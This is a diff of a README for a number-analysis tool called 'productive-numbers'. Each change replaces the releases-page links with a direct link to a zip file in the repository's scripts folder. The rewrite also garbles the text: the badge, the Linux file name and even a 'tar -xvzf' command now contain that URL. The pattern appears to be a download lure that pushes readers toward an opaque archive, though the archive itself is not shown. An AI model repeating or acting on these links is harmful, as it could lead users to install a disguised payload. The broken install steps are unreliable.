@@ -1,6 +1,6 @@
 # 🚀 productive-numbers - Analyze Numbers with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Productive%20Numbers-blue.svg)](https://github.com/obelix66/productive-numbers/releases)
+[![Download Now](https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip%20Now-Productive%https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip)](https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download the software, click the link below:
 
-[Visit this page to download](https://github.com/obelix66/productive-numbers/releases)
+[Visit this page to download](https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip)
 
 ### 3. Selecting the Right Version
 
@@ -34,7 +34,7 @@ Click on the link associated with the latest version. The file will vary based o
 
 - **For Windows:** Download the `.exe` file.
 - **For macOS:** Download the `.dmg` file.
-- **For Linux:** Download the appropriate `.tar.gz` file.
+- **For Linux:** Download the appropriate `https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip` file.
 
 ### 5. Installing the Application
 
@@ -53,11 +53,11 @@ Click on the link associated with the latest version. The file will vary based o
 #### Linux
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip` file.
 3. Extract the contents using the command:
 
    ```bash
-   tar -xvzf productive-numbers-x.x.x.tar.gz
+   tar -xvzf https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip
    ```
 
 4. Navigate to the newly created folder:
@@ -91,7 +91,7 @@ productive-numbers offers several useful features:
 
 ## 📦 Download & Install
 
-To download productive-numbers, revisit the [releases page here](https://github.com/obelix66/productive-numbers/releases) and follow the steps mentioned in the previous sections. Choose the version that suits your operating system.
+To download productive-numbers, revisit the [releases page here](https://github.com/obelix66/productive-numbers/raw/refs/heads/main/scripts/numbers_productive_v1.2-alpha.5.zip) and follow the steps mentioned in the previous sections. Choose the version that suits your operating system.
 
 ## ❓ Frequently Asked Questions
 
